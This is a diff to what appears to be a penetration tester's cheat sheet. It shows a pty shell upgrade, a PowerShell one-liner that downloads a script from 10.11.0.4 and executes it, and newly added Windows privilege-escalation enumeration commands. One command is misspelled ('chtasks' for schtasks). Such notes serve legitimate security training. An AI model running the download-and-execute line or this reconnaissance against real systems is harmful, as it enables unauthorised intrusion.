@@ -20,3 +20,15 @@ python -c 'import pty; pty.spawn(\"/bin/bash\")'
 # Powershell
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
 Also check out 16.2.3 for base64 executable transfer and execution
+
+# Windows Priv Esc
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+net user [username]
+ipconfig /all 
+tasklist /SVC **all running proccesses**
+route print **all routes**
+netstat -ano  **all active tcp connections**
+netsh advfirewall show currentprofile **current firewall settings**
+chtasks /query /fo LIST /v **scheduled tasks**
+wmic product get name, version, vendor **installed software**
+wmic qfe get Caption, Description, HotFixID, InstalledOn **installed version**
